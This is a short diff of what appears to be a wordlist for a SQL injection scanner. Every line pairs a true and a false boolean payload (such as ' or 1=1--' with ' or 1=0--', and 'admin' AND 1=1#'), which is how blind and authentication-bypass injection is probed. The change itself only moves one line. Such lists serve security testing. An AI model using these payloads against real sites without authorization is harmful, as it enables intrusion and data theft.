@@ -6,11 +6,11 @@
 " or 1=1--	" or 1=0--
 " or 1=1#	" or 1=0#
 " or 1=1/*	" or 1=0/*
+ AND 1=1#	 AND 1=0#
 1 or 1=1	1 or 1=0
 1 or 1=1--	1 or 1=0--
 1 or 1=1#	1 or 1=0#
 1 or 1=1/*	1 or 1=0/*
-AND 1=1#	AND 1=0#
 1 and 1=1#	1 and 1=0#
 admin' AND 1=1#	admin' AND 1=0#
 root' AND 1=1#	root' AND 1=0#
